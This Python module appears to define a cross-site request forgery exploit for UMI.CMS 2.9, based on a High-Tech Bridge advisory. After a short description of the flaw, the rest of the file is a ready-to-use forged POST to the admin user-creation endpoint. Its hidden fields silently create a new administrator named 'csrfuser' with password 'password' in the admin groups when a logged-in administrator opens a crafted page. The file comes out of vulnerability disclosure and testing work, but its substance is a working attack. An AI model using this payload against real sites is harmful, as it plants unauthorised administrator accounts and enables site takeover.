# -*- coding: utf-8 -*-

NAME = "UMI.CMS 2.9"
DESCRIPTION = '''The application allows authorized administrator to perform certain sensitive actions via HTTP requests without making proper validity checks to verify the source of these HTTP requests. This can be exploited to perform any actions with administrator privileges, such as adding new administrator to the system.

A remote attacker can create a specially crafted webpage, trick a logged-in administrator to open it and create new user with administrative privileges.

A basic CSRF exploit below will create new administrator with "csrfuser" as a login and "password" as a password'''

AUTHOR = "High-Tech Bridge Security Research Lab"
AUTHOR_URL = "https://www.htbridge.com/advisory/"

METHOD = "POST"
PATH = "/admin/users/add/user/do/"
FORM = {
    "method": "post",
    "id": "main"
}

PARAMS = [
    {
        "name": "data[new][login]",
        "type": "hidden",
        "value": "csrfuser",
        "custom": True,
        "description": "Username of the newly created administrator"
    },
    {
        "name": "data[new][password][]",
        "type": "hidden",
        "value": "password",
        "custom": True,
        "description": "Password of the newly created administrator"
    },
    {
        "name": "data[new][e-mail]",
        "type": "hidden",
        "value": "user@mail.com",
        "custom": True,
        "description": "Email of the newly created administrator"
    },
    {
        "name": "data[new][is_activated]",
        "type": "hidden",
        "value": "1",
        "custom": False
    },
    {
        "name": "data[new][fname]",
        "type": "hidden",
        "value": "username",
        "custom": False
    },
    {
        "name": "data[new][groups][]",
        "type": "hidden",
        "value": "1",
        "custom": False
    },
    {
        "name": "data[new][groups][]",
        "type": "hidden",
        "value": "2",
        "custom": False
    },
    {
        "name": "",
        "type": "hidden",
        "value": "",
        "custom": False
    },
    {
        "type": "submit",
        "id": "btn",
        "custom": False
    }
]